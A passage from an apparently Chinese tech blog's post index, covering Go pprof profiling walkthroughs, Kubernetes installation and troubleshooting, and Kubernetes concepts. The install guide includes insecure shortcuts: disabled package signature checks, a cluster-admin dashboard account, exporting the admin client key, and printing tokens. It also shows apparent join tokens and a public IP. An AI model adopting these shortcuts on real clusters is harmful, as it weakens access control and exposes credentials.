前面每一行的 flat 占比总和                                   |\n  | cum   | 累计量。指该函数加上该函数调用的函数总耗时                   |\n  | cum%  | cum 占 CPU 总时间的比例                                      |\n  \n  \n\n\n# 3. 实践\n\n```bash\n# 下载测试项目\ngit clone https://github.com/wolfogre/go-pprof-practice\n\n# 执行\ngo build\n./go-pprof-practice\n```\n\n\n\n### 3.1 排查CPU\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/profile\n\n# top 查看\n(pprof) top\nShowing nodes accounting for 15270ms, 99.09% of 15410ms total\nDropped 40 nodes (cum <= 77.05ms)\nShowing top 10 nodes out of 11\n      flat  flat%   sum%        cum   cum%\n   12310ms 79.88% 79.88%    12780ms 82.93%  github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat\n    1170ms  7.59% 87.48%     1170ms  7.59%  runtime.memmove\n     800ms  5.19% 92.67%      800ms  5.19%  runtime.memclrNoHeapPointers\n     520ms  3.37% 96.04%     2500ms 16.22%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal\n     470ms  3.05% 99.09%      470ms  3.05%  runtime.asyncPreempt\n         0     0% 99.09%    12780ms 82.93%  github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Live\n         0     0% 99.09%     2500ms 16.22%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Live\n         0     0% 99.09%    15310ms 99.35%  main.main\n         0     0% 99.09%     1980ms 12.85%  runtime.growslice\n         0     0% 99.09%    15310ms 99.35%  runtime.main\n         \n         \n很明显，CPU 占用过高是 github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat 造成的。   \n\n# 输入 list Eat，查看问题具体在代码的哪一个位置：\n\n(pprof) list Eat\nTotal: 15.41s\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/felidae/tiger/tiger.go\n    12.31s     12.78s (flat, cum) 82.93% of Total\n         .          .     19:}\n         .          .     20:\n         .          .     21:func (t *Tiger) Eat() {\n         .          .     22:   log.Println(t.Name(), \"eat\")\n         .          .     23:   loop := 10000000000\n    12.31s     12.78s     24:   for i := 0; i < loop; i++ {\n         .          .     25:           // do nothing\n         .          .     26:   }\n         .          .     27:}\n         .          .     28:\n         .          .     29:func (t *Tiger) Drink() {\n         \n\n可以看到，是第 24 行那个一百亿次空循环占用了大量 CPU 时间，至此，问题定位成功！\n\n\n# 输入 web, 会在浏览器弹出一个图\n图中，tiger.(*Tiger).Eat 函数的框特别大，箭头特别粗，pprof 生怕你不知道这个函数的 CPU 占用很高。\n```\n\n![1](golang的pprof使用/1.png)\n\n\n\n### 3.2 排查内存\n\n```bash\n# 把死循环代码注释, 接着测试, 看内存使用, 注意是 heap\ngo tool pprof http://localhost:6060/debug/pprof/heap\n\n# 看 top\n(pprof) top\nShowing nodes accounting for 768MB, 100% of 768MB total\n      flat  flat%   sum%        cum   cum%\n     768MB   100%   100%      768MB   100%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal\n         0     0%   100%      768MB   100%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Live\n         0     0%   100%      768MB   100%  main.main\n         0     0%   100%      768MB   100%  runtime.main\n\n# 查看占用最多的这个函数\n(pprof) list Steal\nTotal: 768MB\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/muridae/mouse/mouse.go\n     768MB      768MB (flat, cum)   100% of Total\n         .          .     45:\n         .          .     46:func (m *Mouse) Steal() {\n         .          .     47:   log.Println(m.Name(), \"steal\")\n         .          .     48:   max := constant.Gi\n         .          .     49:   for len(m.buffer) * constant.Mi < max {\n     768MB      768MB     50:           m.buffer = append(m.buffer, [constant.Mi]byte{})\n         .          .     51:   }\n         .          .     52:}\n         \n可以看到，这里有个循环会一直向 m.buffer 里追加长度为 1 MiB 的数组，直到总容量到达 1 GiB 为止，且一直不释放这些内存，这就难怪会有这么高的内存占用了。\n\n# 输入 web, 再次在浏览器感受一下, 也可以输入 png\n```\n\n![1](golang的pprof使用/2.png)\n\n\n\n### 3.3 排查 GC\n\n```bash\n# 频繁的 GC 对 golang 程序性能的影响也是非常严重的。虽然现在这个程序内存使用量并不高，但这会不会是频繁 GC 之后的假象呢？\n\n# 为了获取程序运行过程中 GC 日志，我们需要先退出炸弹程序，再在重新启动前赋予一个环境变量，同时为了避免其他日志的干扰，使用 grep 筛选出 GC 日志查看：\nGODEBUG=gctrace=1 ./go-pprof-practice | grep gc\n\ngc 1 @0.003s 2%: 0.004+0.44+0.004 ms clock, 0.004+0.21/0.11/0+0.004 ms cpu, 16->16->0 MB, 17 MB goal, 1 P\ngc 2 @6.201s 0%: 0.041+2.9+0.004 ms clock, 0.041+0.31/0/0+0.004 ms cpu, 7->7->6 MB, 8 MB goal, 1 P\ngc 3 @6.204s 0%: 0.026+6.2+0.003 ms clock, 0.026+0.23/0/0+0.003 ms cpu, 14->14->12 MB, 15 MB goal, 1 P\ngc 4 @6.211s 0%: 0.038+10+0.003 ms clock, 0.038+0.23/0/0+0.003 ms cpu, 28->28->24 MB, 29 MB goal, 1 P\ngc 5 @6.223s 0%: 0.023+26+0.002 ms clock, 0.023+0/0.23/0+0.002 ms cpu, 56->56->48 MB, 57 MB goal, 1 P\ngc 6 @6.251s 0%: 0.038+47+0.003 ms clock, 0.038+0/0.25/0+0.003 ms cpu, 112->112->96 MB, 113 MB goal, 1 P\ngc 7 @6.301s 0%: 0.051+93+0.003 ms clock, 0.051+0/0.24/0+0.003 ms cpu, 224->224->192 MB, 225 MB goal, 1 P\ngc 8 @6.407s 0%: 0.023+192+0.004 ms clock, 0.023+0/0.28/0+0.004 ms cpu, 448->448->384 MB, 449 MB goal, 1 P\ngc 9 @6.631s 0%: 0.053+397+0.003 ms clock, 0.053+0/0.25/0+0.003 ms cpu, 896->896->768 MB, 897 MB goal, 1 P\ngc 10 @7.080s 0%: 0.052+1205+0.003 ms clock, 0.052+0/0.24/0+0.003 ms cpu, 1792->1792->1536 MB, 1793 MB goal, 1 P\n\n\n可以看到，GC 差不多每 3 秒就发生一次，且每次 GC 都会从 16MB 清理到几乎 0MB，说明程序在不断的申请内存再释放，这是高性能 golang 程序所不允许的。\n\n所以接下来使用 pprof 排查时，我们在乎的不是什么地方在占用大量内存，而是什么地方在不停地申请内存，这两者是有区别的。\n\n#由于内存的申请与释放频度是需要一段时间来统计的，所有我们保证炸弹程序已经运行了几分钟之后，再运行命令：\ngo tool pprof http://localhost:6060/debug/pprof/allocs\n\n# top\n(pprof) top\nShowing nodes accounting for 16MB, 100% of 16MB total\n      flat  flat%   sum%        cum   cum%\n      16MB   100%   100%       16MB   100%  github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run (inline)\n         0     0%   100%       16MB   100%  github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Live\n         0     0%   100%       16MB   100%  main.main\n         0     0%   100%       16MB   100%  runtime.main\n         \n# list Run         \n(pprof) list Run\nTotal: 16MB\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/canidae/dog/dog.go\n      16MB       16MB (flat, cum)   100% of Total\n         .          .     38:   log.Println(d.Name(), \"pee\")\n         .          .     39:}\n         .          .     40:\n         .          .     41:func (d *Dog) Run() {\n         .          .     42:   log.Println(d.Name(), \"run\")\n      16MB       16MB     43:   _ = make([]byte, 16 * constant.Mi)\n         .          .     44:}\n         .          .     45:\n         .          .     46:func (d *Dog) Howl() {\n         .          .     47:   log.Println(d.Name(), \"howl\")\n         .          .     48:}\n         \n         \n可以看到 github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run 会进行无意义的内存申请，而这个函数又会被频繁调用，这才导致程序不停地进行 GC\n```\n\n![1](golang的pprof使用/3.png)\n\n### 3.4 排查协程泄露\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/goroutine\n\n# top 查看\n(pprof) top\nShowing nodes accounting for 14, 100% of 14 total\nShowing top 10 nodes out of 27\n      flat  flat%   sum%        cum   cum%\n        12 85.71% 85.71%         12 85.71%  runtime.gopark\n         1  7.14% 92.86%          1  7.14%  net/http.(*connReader).backgroundRead\n         1  7.14%   100%          1  7.14%  runtime/pprof.writeRuntimeProfile\n         0     0%   100%         10 71.43%  github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Drink.func1\n         0     0%   100%          1  7.14%  internal/poll.(*FD).Accept\n         0     0%   100%          1  7.14%  internal/poll.(*pollDesc).wait\n         0     0%   100%          1  7.14%  internal/poll.(*pollDesc).waitRead (inline)\n         0     0%   100%          1  7.14%  internal/poll.runtime_pollWait\n         0     0%   100%          1  7.14%  main.main\n         0     0%   100%          1  7.14%  main.main.func1\n\n# list 函数\n(pprof) list Drink\nTotal: 14\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Drink.func1 in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/canidae/wolf/wolf.go\n         0         10 (flat, cum) 71.43% of Total\n         .          .     29:\n         .          .     30:func (w *Wolf) Drink() {\n         .          .     31:   log.Println(w.Name(), \"drink\")\n         .          .     32:   for i := 0; i < 10; i++ {\n         .          .     33:           go func() {\n         .         10     34:                   time.Sleep(30 * time.Second)\n         .          .     35:           }()\n         .          .     36:   }\n         .          .     37:}\n         .          .     38:\n         .          .     39:func (w *Wolf) Shit() {\n         \n可以看到，Drink 函数每次回释放 10 个协程出去，每个协程会睡眠 30 秒再退出，而 Drink 函数又会被反复调用，这才导致大量协程泄露，试想一下，如果释放出的协程会永久阻塞，那么泄露的协程数便会持续增加，内存的占用也会持续增加，那迟早是会被操作系统杀死的。         \n```\n\n![1](golang的pprof使用/4.png)\n\n### 3.5 排查锁的争用\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/mutex\n\n\n# top 查看\n(pprof) top\nShowing nodes accounting for 1s, 100% of 1s total\n      flat  flat%   sum%        cum   cum%\n        1s   100%   100%         1s   100%  sync.(*Mutex).Unlock (inline)\n         0     0%   100%         1s   100%  github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Howl.func1\n         \n# list 函数       \n(pprof) list Howl\nTotal: 1s\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Howl.func1 in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/canidae/wolf/wolf.go\n         0         1s (flat, cum)   100% of Total\n         .          .     53:\n         .          .     54:   m := &sync.Mutex{}\n         .          .     55:   m.Lock()\n         .          .     56:   go func() {\n         .          .     57:           time.Sleep(time.Second)\n         .         1s     58:           m.Unlock()\n         .          .     59:   }()\n         .          .     60:   m.Lock()\n         .          .     61:}\n         \n这个锁由主协程 Lock，并启动子协程去 Unlock，主协程会阻塞在第二次 Lock 这儿等待子协程完成任务，但由于子协程足足睡眠了一秒，导致主协程等待这个锁释放足足等了一秒钟。         \n```\n\n![1](golang的pprof使用/5.png)\n\n### 3.6 排查阻塞操作\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/block\n\n# top list web 大法\n```\n\n\n\n# 4. 火焰图\n\n```bash\n# 在上面例子中\ngo tool pprof -seconds 10 http://127.0.0.1:6060/debug/pprof/profile\n\ngo tool pprof -http=:8081 ~/pprof/pprof.samples.cpu.002.pb.gz\n\n# 可以在页面中 view->flamegraph 查看火焰图\nhttp://localhost:8081/ui/flamegraph\n```\n\n![1](golang的pprof使用/6.png)\n\n\n\n# 5. 参考资料\n\n+ https://golang.org/pkg/net/http/pprof/\n+ https://blog.wolfogre.com/posts/go-ppof-practice/\n\n\n","tags":["golang"],"categories":["golang"]},{"title":"k8s的安装和使用","url":"%2Fp%2Fcaa8b60.html","content":"\n# 1. 安装\n\n### 1.1 安装前要求\n\nMaster服务器要2GB RAM 和 2个 CPU, docker和 k8s 在 master 和 node 节点都需要安装.\n\n<!-- more -->\n\n### 1.2 安装docker\n\n```bash\napt update\napt install docker.io\n```\n\n### 1.3 安装k8s\n\n```bash\n# ubuntu 安装\ncurl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -\n\ncat <<EOF | sudo tee /etc/apt/sources.list.d/kubernetes.list\ndeb https://apt.kubernetes.io/ kubernetes-xenial main\nEOF\n\napt update\napt install -y kubelet kubeadm kubectl\n\n\n# centos 安装\ncat <<EOF > /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\ngpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\nEOF\n\nyum install -y kubelet kubeadm kubectl\n```\n\n修改网络配置\n\n```bash\ncat <<EOF > /etc/sysctl.d/k8s.conf\nnet.bridge.bridge-nf-call-ip6tables = 1\nnet.bridge.bridge-nf-call-iptables = 1\nEOF\n\nsysctl --system\n```\n\n禁止 swap\n\n```bash\nswapoff -a\n```\n\n\n\n# 2. 操作\n\n### 2.1 kubeadm 创建\n\n```bash\nkubeadm init\n\n# 显示下面就是成功了\nYour Kubernetes control-plane has initialized successfully!\nkubeadm join 10.128.0.2:6443 --token essacx.dirj093suimneobu \\\n    --discovery-token-ca-cert-hash sha256:ccfba722f83313d31e27249300501ea88ef0560d7674b7a063fca5b2a3db357c\n```\n\n如果安装过程出现问题, 重置\n\n```bash\nkubeadm reset\nsystemctl stop kubelet\nsystemctl stop docker\nrm -rf /var/lib/cni/\nrm -rf /var/lib/calico/\nrm -rf /var/lib/kubelet/*\nrm -rf /etc/cni/\n\nsystemctl start docker\nsystemctl start kubelet\nkubeadm init\n```\n\n\n\n### 2.2 获取 node 信息\n\n```bash\nkubectl get nodes -o wide\n# 报错\nerror: no configuration has been provided, try setting KUBERNETES_MASTER environment variable\n\n# 非 root用户\nmkdir -p HOME/.kube\nsudo cp -i /etc/kubernetes/admin.conf HOME/.kube/config\nsudo chown (id -u):(id -g) $HOME/.kube/config\n\n#root 用户\nexport KUBECONFIG=/etc/kubernetes/admin.conf\n```\n\n再次获取可看到状态\n\n```bash\nkubectl get nodes # 此处的NotReady是因为网络还没配置.\nNAME   STATUS     ROLES    AGE   VERSION\nus     NotReady   master   10m   v1.18.2\n```\n\n\n\n### 2.3 配置网络\n\n选一个即可\n\n+ 安装Calico\n\n```bash\nwget https://docs.projectcalico.org/v3.11/manifests/calico.yaml\n\n\n# calico.yaml 文件添加以下二行\n- name: IP_AUTODETECTION_METHOD\n\tvalue: \"interface=ens.*\"  # ens 根据实际网卡开头配置\n\n\nkubectl delete -f calico.yaml\nkubectl apply -f calico.yaml\n```\n\n+ 安装 flannel\n\n```bash\nwget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml\n\nkubectl delete -f kube-flannel.yml\nkubectl apply -f kube-flannel.yml\n```\n\n\n\n### 2.4 添加Worker节点\n\n```bash\n# 获取 nodes\nkubectl get nodes -o wide\n\n# 删除 nodes\nkubectl delete nodes tencent\n\n# 在被删除的node节点清空集群信息\nkubeadm reset\n\n# 在master节点查看集群的token值(在 master 机器操作)\nkubeadm token create --print-join-command\n\n# 将node节点重新添加到k8s集群中(在 node 机器操作)\nkubeadm join 10.128.0.2:6443 --token oa5h63.wylpy4upqzp5nxl4     --discovery-token-ca-cert-hash sha256:182bf7a949b7cad1511df0b38e340dde0196084522132ab6a32da1ae9e4c9d1a\n```\n\n\n\n# 3. 应用部署\n\n### 3.1 nginx\n\n```bash\nvi nginx-pod.yaml\n\napiVersion: v1      # 描述文件所遵循KubernetesAPI的版本\nkind: Pod           # 描述的类型是pod\nmetadata:\n  name: nginx-pod   # pod的名称\n  labels:           # 标签\n    app: nginx-pod\n    env: test\nspec:\n  containers:\n    - name: nginx-pod     # 容器名\n      image: nginx:1.15   # 镜像名称及版本\n      imagePullPolicy: IfNotPresent   # 如果本地不存在就去远程仓库拉取\n      ports:\n        - containerPort: 80   # pod对外端口\n  restartPolicy: Always\n```\n应用和删除\n```bash\nkubectl apply -f nginx-pod.yaml  # 应用\nkubectl delete -f nginx-pod.yaml # 删除\n```\n\n注意, nginx 是在 node 节点上面运行的, 而不是 master, 可以通过 docker ps 查看\n\n\n\n+ 访问nginx\n\n  想要访问到pod中的服务, 最简单的方式就是通过端口转发, 执行如下命令, 将宿主机的`9999`端口与nginx-pod的`80`端口绑定:\n\n  ```bash\n  kubectl port-forward --address 0.0.0.0 nginx-pod 9999:80\n  ```\n\n  然后在 master 身上访问\n\n  ```bash\n  curl localhost:9999\n  ```\n\n  \n\n\n\n# 8. 部署图形界面\n\n### 8.1 下载\n\n  https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/\n\n```bash\nkubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml\n\nkubectl get pods --all-namespaces \n# 部署完毕后, 执行可以看到有 dashboard\n```\n\n\n\n### 8.2 创建用户\n\n+ vi dashboard-adminuser.yaml\n\n  按照下面的去写, 否则可能有权限问题\n\n```bash\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: admin-user\n  namespace: kube-system\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: admin-user\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n- kind: ServiceAccount\n  name: admin-user\n  namespace: kube-system\n```\n\n\n\n```bash\nkubectl apply -f dashboard-adminuser.yaml\n# 显示 clusterrolebinding.rbac.authorization.k8s.io/admin-user created\n```\n\n\n\n### 8.3 访问dashboard\n\nhttps://34.66.187.249:6443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy\n\n报错  \"message\": \"services \\\"https:kubernetes-dashboard:\\\" is forbidden: User \\\"system:anonymous\\\" cannot get resource \\\"services/proxy\\\" in API group \\\"\\\" in the namespace \\\"kubernetes-dashboard\\\"\",\n\n\n这个是因为kubernetes基于安全性的考虑，浏览器必须要一个根证书，防止中间人攻击\n\n```bash\n# 生成crt\ngrep 'client-certificate-data' /etc/kubernetes/admin.conf | head -n 1 | awk '{print $2}' | base64 -d >> kubecfg.crt\n\n# 生成key文件\ngrep 'client-key-data' /etc/kubernetes/admin.conf | head -n 1 | awk '{print $2}' | base64 -d >> kubecfg.key\n\n# 生成p12证书文件（证书的生成和导入需要一个密码, 建议输入密码）\nopenssl pkcs12 -export -clcerts -inkey kubecfg.key -in kubecfg.crt -out kubecfg.p12 -name \"kubernetes-client\"\n```\n\n\n\nkubecfg.p12即需要导入客户端机器的证书. 将证书拷贝到客户端机器上(自己的电脑), 导入即可(登录钥匙链并且始终信任). \n再次登录时会提示选择证书, 确认后会提示输入当前用户名密码(注意是电脑的用户名密码)\n\n```bash\n# 执行, 复制 token 到浏览器即可\nkubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk '{print $1}')\n```\n\n\n\n# 9. 错误问题总结\n\n### 9.1 如何停止 kube-schedule\n\n```bash\nsystemctl stop kubelet\n```\n\n### 9.2 dashboard无法查看的问题\n\nnodes is forbidden: User \"system:serviceaccount:kubernetes-dashboard:kubernetes-dashboard\" cannot list resource \"nodes\" in API group \"\" at the cluster scope\n\n其实很明显就是用户system:serviceaccount:kubernetes-dashboard:kubernetes-dashboard没有相关权限\n\n修改dashboard-adminuser.yaml 如上文所示即可\n\n### 9.3 镜像拉取失败 GFW\n\nFailed to create pod sandbox: rpc error: code = Unknown desc = failed pulling image \"k8s.gcr.io/pause:3.1\": Error response from daemon: Get https://k8s.gcr.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\n\nMountVolume.SetUp failed for volume \"kube-proxy\" : failed to sync configmap cache: timed out waiting for the condition\n\nFailed to pull image \"k8s.gcr.io/kube-proxy:v1.18.2\": rpc error: code = Unknown desc = Error response from daemon: Get https://k8s.gcr.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\n\n```bash\ndocker pull registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1\ndocker tag  registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 k8s.gcr.io/pause:3.1\n\ndocker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.18.2 \ndocker tag  registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.18.2   k8s.gcr.io/kube-proxy:v1.18.2\n```\n\n### 9.4  calico无法启动\n\n Readiness probe failed: calico/node is not ready: felix is not ready: Get http://localhost:9099/readiness: dial tcp 127.0.0.1:9099: connect: connection refused\n\n修改calico.yaml, 增加`IP_AUTODETECTION_METHOD`环境变量, 在 IP 的下面\n\n```bash\n- name: IP\n\tvalue: \"autodetect\"\n- name: IP_AUTODETECTION_METHOD\n\tvalue: \"interface=eth.*\"\n```\n\n重启calico\n\n```bash\nkubectl delete -f calico.yaml\nkubectl apply -f calico.yaml\n```\n\n\n\n### 9.5 node 无法 join\n\n [ERROR FileContent–proc-sys-net-ipv4-ip_forward]: /proc/sys/net/ipv4/ip_forward contents are not set to 1\n\n```bash\necho 1 > /proc/sys/net/ipv4/ip_forward\n```\n\n\n\n# 10. 常用命令\n\n```bash\n# 查看状态\nkubectl get nodes --all-namespaces -o wide\nkubectl get pods --all-namespaces -o wide\n\n\n# 查看 pod 信息\nkubectl describe pods name\nkubectl describe pods -n kube-system name\n\n\n# 获取 token, 加入\nkubeadm token create --print-join-command\n\n\n# 清理\nkubeadm reset\nrm -rf /var/lib/cni/ && rm -rf /var/lib/calico/ && rm -rf /var/lib/kubelet/ && rm -rf /etc/cni/\nkubeadm init\n```\n\n\n\n# 11. 参考教程\n\n+ https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/\n+ https://juejin.im/post/5d7fb46d5188253264365dcf\n+ https://juejin.im/post/5e1e96ef6fb9a02fbd378588\n","tags":["k8s"],"categories":["k8s"]},{"title":"k8s的介绍","url":"%2Fp%2F40c9599.html","content":"\n\n\n# 0. 前言\n\n先来看一张 k8s 架构设计以及组件之间的通信协议\n\n![1](k8s的介绍/1.jpeg)\n\n<!-- more -->\n\n+ Master\n  \n  Master 负责管理整个集群。Master 协调集群中的所有活动，例如调度应用、维护应用的所需状态、应用扩容以及推出新的更新。\n  \n  + APISERVER 所有服务统一入口\n  + RC 维持副本期望数目\n  + Scheduler 负责介绍任务, 选择合适的节点分配任务 \n  + Etcd 持久化存储信息\n  \n+ Node\n  \n  Node在 Kubernetes 集群中充当工作机器的角色。告诉 Master 启动应用容器， Master 就编排容器在群集的 Node 上运行。 Node 使用 Master 暴露的 Kubernetes API 与 Master 通信。\n  \n  + kubelet 直接跟容器引擎(docker)交互, 实现容器的生命周期管理\n  + kube-proxy 负责写入规则到 IPTABLES, IPVS 实现服务映射访问\n\n\n\n### 0.1 抽象视图：\n\n![1](k8s的介绍/2.png)\n\n\n\n### 0.2 Master架构:\n\n![1](k8s的介绍/3.png)\n\n\n\n### 0.3 Node架构:\n\n![1](k8s的介绍/4.png)\n\n\n\n\n\n# 1. Pod\n\n### 1.1 自主式 pod\n\npod 里面的容器, 通过 pause 网络共享和文件共享\n\n### 1.2 控制器管理的 pod\n\n+ ReplicationController\n\n  建议用 RS代替\n\n+ ReplicaSet\n\n  支持集合式的selector\n\n+ Deployment\n\n  自动管理 ReplicatSet\n\n  + HPA\n\n    弹性伸缩, 增加或减少 pod\n\n+ StatefulSet\n\n  解决有状态服务的问题(Deployment和ReplicaSet是无状态服务)\n\n+ DaemonSet\n\n  确保 Node 运行 pod 的副本\n\n+ Job, CronJob\n\n  负责批处理任务\n\n\n\n# 3. 网络通信\n\n### 3.1 同一个 pod\n\n共享网络命名空间\n\n### 3.2 pod1, pod2\n\n+ 同一主机, docker0网段\n+ 不同主机, podIP 和 nodeIP 关联起来(flannel)\n\n### 3.3 pod, service\n\n+ iptables转发和维护\n+ lvs转发和维护\n\n### 3.4 pod, 外网\n\n转发到宿主主机的网卡\n\n### 3.5 外网, pod\n\nservice, nodeport 方式\n\n\n\n# 4. kubectl \n\n+ kubectl version \n\n  client  version 是kubectl的版本\n\n  server version 是 k8s 的版本\n\n  \n\n+ kubectl get nodes\n\n  查看所有的 node 节点\n\n  \n\n+ kubectl get pods \n\n  查看 pod 节点\n\n  \n\n+ kubectl describe pods \n\n  查看 pod 状态, 例如 ip , 里面的容器之类的\n\n  \n\n+ kubectl describe services/kubernetes-bootcamp  \n\n  查看services状态\n\n  \n\n+ kubectl get services \n\n  查看services\n\n\n\n+ kubectl expose deployment/kubernetes-bootcamp --type=\"NodePort\" --port 8080  \n\n  新建 service 并暴露端口\n\n  \n\n+ kubectl delete service -l run=kubernetes-bootcamp  \n\n  删除一个 service\n\n\n\n+ kubectl create deployment  创建deployment\n\n  kubectl create deployment kubernetes-bootcamp --image=gcr.io/google-samples/kubernetes-bootcamp:v1\n\n  \n\n+ kubectl get deployments\n\n  获取deployments\n\n\n\n+ kubectl describe deployment \n\n  查看deployment\n\n  \n\n+ kubectl label pod $POD_NAME app=v1  \n\n  给 pod 加个 lable\n\n  \n\n+ kubectl get pods -l app=v1  \n\n  加完 lable 就能查看了\n\n  \n\n+ kubectl get rs \n\n  查看拷贝列表\n\n  \n\n+ kubectl scale deployments/kubernetes-bootcamp --replicas=2  \n\n  直接复制品,牛逼了\n\n  \n\n+ kubectl logs  查看日志\n\n  kubectl logs $POD_NAME\n\n  \n\n+ kubectl exec 执行命令\n\n  kubectl exec $POD_NAME env  查看环境变量\n\n  kubectl exec -ti $POD_NAME bash  进入到 pod 里面\n\n  \n\n+ kubectl set image deployments/kubernetes-bootcamp kubernetes-bootcamp=gcr.io/google-samples/kubernetes-bootcamp:v10\n\n  更换 image\n\n  \n\n+ kubectl rollout status deployments/kubernetes-bootcamp \n\n  查看状态\n\n  \n\n+ kubectl rollout undo deployments/kubernetes-bootcamp  \n\n  回滚\n\n\n\n\n\n# 5. 问题记录\n\n+ minikube是干啥的?\n\n   minikube 是一种轻量级的 Kubernetes 实现，可在本地计算机上创建 VM 并部署仅包含一个节点的简单集群。\n\n  简单理解为一个运行在本地Node，我们可以在里面创建Pods来创建对应的服务.\n\n\n\n+ deployment和 pods的关系\n\n  pod是单一亦或一组容器的合集, deployment是pod版本管理的工具 用来区分不同版本的pod, 可以回滚版本\n\n  单独创建pod的时候就不会有deployment出现，但是创建deployment的时候一定会创建pod,因为pod是一个基础的单位。\n\n\n\n\n\n# 6. 参考资料\n\n+ https://kubernetes.io/zh/docs/tutorials/hello-minikube/\n+ https://www.bookstack.cn/read/kubernetes-handbook/concepts-index.md\n+ https://www.bilibili.com/video/BV1w4411y7Go\n\n","tags":["k8s"],"categories":["k8s"]},{"title":"k8s的初探","url":"%2Fp%2F890e8359.html","content":"\n# 0. 前言\n\nKubernetes中的大部分概念Node、Pod、Replication Controller、Service等都可以看作一种“资源对象”，几乎所有的资源对象都可以通过kubectl工具（API调用）执行增、删、改、查等操作并将其保存在etcd中持久化存储。从这个角度来看，kubernetes其实是一个高度自动化的资源控制系统，通过跟踪对比etcd库里保存的“资源期望状态”与当前环境中的“实际资源状态”的差异来实现自动控制和自动纠错的高级功能。\n\n<!-- more -->\n\n\n# 1. Kubernetes 本地安装\n\n我们需要安装以下东西：Kubernetes 的命令行客户端 kubctl、一个可以在本地跑起来的 Kubernetes 环境 Minikube。\n\n### 1.1 安装 k8s\n\n```bash\ncat <<EOF > /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=1\nrepo_gpgcheck=1\ngpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\nexclude=kube*\nEOF\n\n\n\nyum install -y kubelet kubeadm kubectl --disableexcludes=kubernetes\nsystemctl enable kubelet && systemctl start kubelet\n```\n\n\n\n### 1.2 安装 minikube\n\nminikube 是一种轻量级的 Kubernetes 实现，可在本地计算机上创建 VM 并部署仅包含一个节点的简单集群。简单理解为一个运行在本地Node，我们可以在里面创建Pods来创建对应的服务.\n\n```bash\ncurl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 \\\n   && sudo install minikube-linux-amd64 /usr/local/bin/minikube\n   \n   \nminikube start --vm-driver=none --image-repository=registry.cn-hangzhou.aliyuncs.com/google_containers\n```\n\n\n\n为什么增加后面的image-repository, 因为GFW总是会在无形中增加学习的难度. 请参考: https://github.com/kubernetes/minikube/issues/3860\n\n\n\nminikube 启动时会自动配置 kubectl，把它指向 Minikube 提供的 Kubernetes API 服务。可以用下面的命令确认：\n\n```bash\n$ kubectl config current-context\nminikube\n```\n\n\n\n# 2. 使用\n\n典型的 Kubernetes 集群包含一个 master 和多个 node。每个 node 上运行着维护 node 状态并和 master 通信的 